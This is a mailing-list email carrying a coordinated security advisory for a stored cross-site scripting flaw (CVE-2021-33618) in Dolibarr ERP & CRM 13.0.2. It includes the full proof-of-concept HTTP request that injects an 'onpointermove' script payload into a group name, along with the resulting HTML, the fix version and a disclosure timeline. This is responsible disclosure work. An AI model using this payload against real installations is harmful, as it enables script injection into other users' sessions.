X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["5650" "Wednesday" "10" "November" "2021" "11:36:13" "+0000" "Stefan Pietsch" "s.pietsch@trovent.io" nil "185" "[oss-security] Trovent Security Advisory 2105-02 / CVE-2021-33618: Stored cross-site scripting in Dolibarr ERP & CRM" nil nil nil "11" nil nil (number mark "U       s.pietsch@tr Nov 10  185/5650  " thread-indent "\"[oss-security] Trovent Security Advisory 2105-02 / CVE-2021-33618: Stored cross-site scripting in Dolibarr ERP & CRM\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Trovent Security Advisory 2105-02 / CVE-2021-33618: Stored cross-site scripting in Dolibarr ERP & CRM" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 1773 invoked by uid 550); 10 Nov 2021 11:44:16 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 30608 invoked from network); 10 Nov 2021 11:36:28 -0000
Date: Wed, 10 Nov 2021 11:36:13 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=trovent.io;
	s=protonmail; t=1636544176;
	bh=2aNm6XLCP6HuS+Fs+dsfA0yJmoRVOmERWnxj7KcN8S0=;
	h=Date:To:From:Reply-To:Subject:From;
	b=OCX58w9ZQ2qG2CbjdxskQL34igboN/W/NfQQFl5AHPLYazPZb4YMbk5ophU5tM6iM
	 NtwcMwafdp4m7Q6EKtQkazRcls3zb3PKQJxpV1zI4PQZHNbA9dvUeHoORDh29h+DRk
	 OAkAJzPuEpNZJGrwT7bdAybKwSXUz0qH4fNemS4WUNNT6Egj4fHE5t2WH6NobjROIu
	 Cc/Sst7rZFFUFzxzdScPZISO57Oh7EXBTTxqZ4NFmnREjzU9Ow8lYM9ptRtf1MuTwU
	 8E1PYo/1HoM2hKGZoyGgqhq0yx10ZDiee1WaUgo5Z14/CPGkOQZvg7zRr3raMZE1R/
	 aeFgVg7W6SvqA==
To: Packet Storm <submissions@packetstormsecurity.com>, Full Disclosure <fulldisclosure@seclists.org>, oss-security <oss-security@lists.openwall.com>
From: Stefan Pietsch <s.pietsch@trovent.io>
Message-ID: <OpF3Ka8B9NOKStlDWy808_uPhKQ3flbllrA6ylRDkyen9W3HMT3I3RgPBSnq7949ZRU5Xld2MRpjSmRJrWVpjBvtfdYpPHLwNRPY9Dm6orU=@trovent.io>
MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pgp-signature"; micalg=pgp-sha256; boundary="------2ebdfc1ef9307a80fd613682ac145c041eb8bd314b146e4f461f9fb8d1cd7b96"; charset=utf-8
Subject: [oss-security] Trovent Security Advisory 2105-02 / CVE-2021-33618: Stored cross-site scripting in Dolibarr ERP & CRM

--------2ebdfc1ef9307a80fd613682ac145c041eb8bd314b146e4f461f9fb8d1cd7b96
Content-Type: multipart/mixed;boundary=---------------------fb37858befa9ad6270622381eea4c290

-----------------------fb37858befa9ad6270622381eea4c290
Content-Transfer-Encoding: quoted-printable
Content-Type: text/plain;charset=utf-8

# Trovent Security Advisory 2105-02 #
#####################################


Stored cross-site scripting in Dolibarr ERP & CRM
#################################################


Overview
########

Advisory ID: TRSA-2105-02
Advisory version: 1.0
Advisory status: Public
Advisory URL: https://trovent.io/security-advisory-2105-02
Affected product: Dolibarr ERP & CRM
Tested versions: Dolibarr 13.0.2
Vendor: Dolibarr foundation, https://www.dolibarr.org
Credits: Trovent Security GmbH, Nick Decker


Detailed description
####################

Trovent Security GmbH discovered that the Dolibarr application does not esc=
ape
"greater than" and "smaller than" characters if they are reflected in one o=
f the
small pop-up windows with details of the object.
This allows an attacker to add certain custom HTML tags and attributes.
In our PoC we used a "body" tag in conjunction with an "onpointermove" attr=
ibute
to achieve constant execution of the inserted JavaScript code.

Severity: Critical
CVSS Score: 9.0 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H)
CWE ID: CWE-79
CVE ID: CVE-2021-33618


Proof of concept
################

This is the HTTP request to change the group name:

REQUEST:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


POST /user/group/card.php HTTP/1.1
Host: 10.11.9.80
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox=
/78.0 -securitytest-for-dolibarr
Accept: text/html,application/xhtml+xml,application/xml;q=3D0.9,image/webp,=
*/*;q=3D0.8
Accept-Language: en-US,en;q=3D0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=3D---------------------------32=
9097076628264922392755475836
Content-Length: 950
Origin: http://10.11.9.80
Connection: close
Referer: http://10.11.9.80/user/group/card.php?id=3D1&action=3Dedit&token=
=3D4726524fe505b027519a535e08c11fb6
Cookie: PHPSESSID=3D8s2jl8fhmbm5th8r4baasak1q2; DOLSESSID_736206a8219848378=
77b8a6a901910d2=3D4jkf7smp24evfm3vvnnunj8jaq
Upgrade-Insecure-Requests: 1

- -----------------------------329097076628264922392755475836
Content-Disposition: form-data; name=3D"token"

6585d0838337cafddc3387fcccbe9d91
- -----------------------------329097076628264922392755475836
Content-Disposition: form-data; name=3D"action"

update
- -----------------------------329097076628264922392755475836
Content-Disposition: form-data; name=3D"backtopage"

/user/group/card.php?id=3D1
- -----------------------------329097076628264922392755475836
Content-Disposition: form-data; name=3D"id"

1
- -----------------------------329097076628264922392755475836
Content-Disposition: form-data; name=3D"nom"

Trovent<<body onpointermove=3Dalert(1) <>test
- -----------------------------329097076628264922392755475836
Content-Disposition: form-data; name=3D"note"


- -----------------------------329097076628264922392755475836
Content-Disposition: form-data; name=3D"save"

Save
- -----------------------------329097076628264922392755475836--


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~




CODE:

The HTML code of the site then includes the attribute in its body tag:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


<body id=3D"mainbody" class=3D"sidebar-collapse" <=3D"" onpointermove=3D"al=
ert(1)" style=3D"margin-bottom: 26px;">

<!-- Start top horizontal -->
<div class=3D"side-nav-vert"><div id=3D"id-top"><div id=3D"tmenu_tooltip" c=
lass=3D"tmenu">
[...]


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
~~~~~


Solution / Workaround
#####################

To mitigate this vulnerability, we recommend to always escape the user input
regardless of where it is reflected. Additionally we recommend to blacklist=
 all
HTML tags and attributes.

Fixed in Dolibarr version 14.0.0, verified by Trovent.


History
#######

2021-05-25: Vulnerability found
2021-05-28: CVE ID requested & received
2021-05-31: Vendor contacted
2021-06-02: Vendor reported the vulnerability as fixed
2021-11-08: Add information about fixed version
2021-11-10: Advisory published

-----------------------fb37858befa9ad6270622381eea4c290--

--------2ebdfc1ef9307a80fd613682ac145c041eb8bd314b146e4f461f9fb8d1cd7b96
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: ProtonMail

wsFzBAEBCAAGBQJhi66WACEJEM8er/4ehY63FiEE0wArIZvu5AKY9ZSXzx6v
/h6Fjrc3xw/5AcnUej6WA9xUyIG5Xngt/jSKJeLvXUFj9J5vAyMJtiH5Fn9Z
99FcK1HROu4/ymHdRxkUV/TGvh/wU/frkxjqbw9v3WM4p7pEvODd+OBwcd3G
IyMNOM/losfF/S4LfILyWHdzuDLqgEat2rTQC73InE1PvvU8iglDH2PzVfmG
mAHR5U1l6WU2ccgJjGT8wQGZsO0EyJc394ooKwQIGmdq+6ohDtdTabu22tvU
oiUK5A45a2hIQEGIrwnWQC41q44NdE3HmIgP5U4uhI+868G+1sXqDyTDlT1F
SS1UD391Za4ll5tGH7q/NstAYPSRRWAtbwaUIqfkXwij4EabyjUonZcOGFWL
r7pnCkw7DNOScgnnJUXYrwkiY0IBPIJh/4MHxJRer6Lga+1D0xoV+H79FYte
0zMo99TtXVQ2jvL1P8Gd4naFrqem8Y65L8Z3DWX2SXEJLopeZ1pS33ylyuHJ
u2x6f5oiH531BqRjDjlkTOYM469fTr+d1nUhGV1NzdmpD+dccjAU2TZx5BcI
DYwnPUNs+CoOSfa6laTvLeEjKdKCzWVZKq0wpLj07UhC8Jhv5cptTOXNklql
AKVN6OwgP0V9/S7cBcYqcp5iKTG2TOgVY3Y/CqtutpG6FqaMbdJKvH/3UM0t
onjl+Is/vZMuvjWUbgecR8Sy9HuQJV5ePRs=
=LNvM
-----END PGP SIGNATURE-----


--------2ebdfc1ef9307a80fd613682ac145c041eb8bd314b146e4f461f9fb8d1cd7b96--

